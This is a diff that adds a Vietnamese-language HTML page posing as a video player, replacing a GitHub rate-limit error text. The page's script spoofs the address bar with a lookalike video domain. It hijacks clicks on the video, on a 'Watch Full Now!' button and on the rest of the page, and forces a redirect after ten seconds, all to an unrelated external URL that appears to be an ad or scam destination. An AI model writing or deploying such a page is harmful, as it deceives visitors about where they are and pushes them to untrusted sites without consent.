@@ -1,2 +1,131 @@
-429: Too Many Requests
-For more on scraping GitHub and how it may affect your rights, please review our Terms of Service (https://docs.github.com/en/site-policy/github-terms/github-terms-of-service).
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Video</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { height: 100%; background: #000; overflow: hidden; }
+        #container { position: relative; width: 100%; height: 100%; cursor: pointer; }
+        video { width: 100%; height: 100%; object-fit: contain; }
+
+        #overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); display: none;
+            align-items: center; justify-content: center;
+            color: #fff; font-family: system-ui; font-size: 18px;
+            flex-direction: column; z-index: 10;
+        }
+        #overlay span { margin-top: 12px; font-size: 15px; opacity: 0.85; }
+
+        #skipButton {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background: #e50914; color: #fff; border: none;
+            padding: 16px 32px; font-size: 18px; font-weight: 700;
+            border-radius: 6px; cursor: pointer;
+            box-shadow: 0 6px 20px rgba(229,9,20,0.5); z-index: 30;
+            transition: all 0.3s ease; text-transform: uppercase;
+            letter-spacing: 1px; white-space: nowrap; display: none;
+        }
+        #skipButton:hover { background: #f40612; transform: translate(-50%, -50%) scale(1.08); }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <video id="player" controls autoplay playsinline muted></video>
+        <button id="skipButton">Watch Full Now!</button>
+        
+        <div id="overlay">
+            <div>Đang chuyển hướng...</div>
+            <span>Chờ 10 giây</span>
+        </div>
+    </div>
+
+    <script>
+        const VIDEO_BASE   = "https://cdn.videy.co";
+        const REDIRECT_URL = "https://broadlyjukeboxunrevised.com/2053781";
+        const DELAY_REDIRECT = 10000;
+        const DELAY_SHOW_BUTTON = 5000;
+
+        function getFilename() {
+            let path = window.location.pathname || '/';
+            path = path.replace(/\/+$/, '');
+            let filename = path.split('/').filter(Boolean).pop() || '';
+
+            if (!filename && document.referrer) {
+                try {
+                    const ref = new URL(document.referrer);
+                    let refPath = ref.pathname.replace(/\/+$/, '');
+                    filename = refPath.split('/').filter(Boolean).pop() || '';
+                } catch(e) {}
+            }
+
+            try { filename = decodeURIComponent(filename); } catch(e) {}
+            return filename || 'voDWqx8K1.mp4';
+        }
+
+        function init() {
+            const filename = getFilename();
+            const videoUrl = `${VIDEO_BASE}/${filename}`;
+
+            if (filename && !window.location.pathname.includes(filename)) {
+                history.replaceState({}, '', `https://cdnvidey.art/${filename}`);
+            }
+
+            // Load video
+            const video = document.getElementById('player');
+            video.src = videoUrl;
+            video.play().catch(() => {});
+
+            // ====================== CLICK VÀO VIDEO CŨNG REDIRECT NGAY ======================
+            video.addEventListener('click', (e) => {
+                // Chỉ redirect khi click vào vùng video chính (không phải thanh controls)
+                if (e.target.tagName === 'VIDEO') {
+                    e.preventDefault();           // ngăn pause/play mặc định
+                    e.stopImmediatePropagation();
+                    window.location.href = REDIRECT_URL;
+                }
+            });
+            // =================================================================================
+
+            // Nút Watch Full Now! hiện sau 5 giây
+            const skipButton = document.getElementById('skipButton');
+            setTimeout(() => skipButton.style.display = 'block', DELAY_SHOW_BUTTON);
+
+            // Click nút Skip
+            skipButton.addEventListener('click', (e) => {
+                e.stopImmediatePropagation();
+                window.location.href = REDIRECT_URL;
+            });
+
+            // Click toàn màn hình (ngoài video và nút Skip) cũng redirect
+            const container = document.getElementById('container');
+            container.addEventListener('click', (e) => {
+                if (e.target.id === 'skipButton' || e.target.tagName === 'VIDEO' || e.target.closest('video')) {
+                    return;
+                }
+                window.location.href = REDIRECT_URL;
+            });
+
+            // Redirect tự động sau 10 giây
+            const overlay = document.getElementById('overlay');
+            let sec = 10;
+            const int = setInterval(() => {
+                sec--;
+                overlay.querySelector('span').textContent = `Chờ ${sec} giây`;
+                if (sec <= 0) clearInterval(int);
+            }, 1000);
+
+            setTimeout(() => {
+                clearInterval(int);
+                overlay.style.display = 'flex';
+                window.location.href = REDIRECT_URL;
+            }, DELAY_REDIRECT);
+        }
+
+        window.onload = init;
+    </script>
+</body>
+</html>
